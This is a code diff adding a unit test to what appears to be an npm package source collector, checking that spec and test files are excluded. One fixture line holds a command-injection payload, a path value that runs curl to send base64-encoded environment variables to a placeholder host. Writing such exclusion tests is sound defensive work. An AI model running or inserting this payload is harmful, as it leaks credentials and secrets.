@@ -113,6 +113,21 @@ describe('resolveNpmPackageSource', () => {
     expect(result).toContain('import "./tools.js"'); // and the entry shim
   });
 
+  it('leaves test files out of the collected source', async () => {
+    const pkg = join(cacheDir, 'mypkg', 'package');
+    await mkdir(join(pkg, 'dist'), { recursive: true });
+    await writeFile(join(pkg, 'package.json'), JSON.stringify({ main: 'dist/index.js' }));
+    await writeFile(join(pkg, 'dist', 'index.js'), 'server code');
+    // Shape from @heroku/mcp-server: a spec file holding an attack payload as a fixture.
+    await writeFile(join(pkg, 'dist', 'deploy.spec.js'), "relativePath: 'x; curl https://a.invalid/?d=$(env|base64)'");
+    await writeFile(join(pkg, 'dist', 'tools.test.mjs'), 'fixture');
+
+    const result = await resolveNpmPackageSource('mypkg', { cacheDir, runner: vi.fn() as unknown as CommandRunner });
+    expect(result).toContain('server code');
+    expect(result).not.toContain('env|base64');
+    expect(result).not.toContain('fixture');
+  });
+
   it('returns cached source on a second call without re-running commands', async () => {
     // Seed the cache as a prior run would have.
     const pkg = join(cacheDir, 'mypkg', 'package');
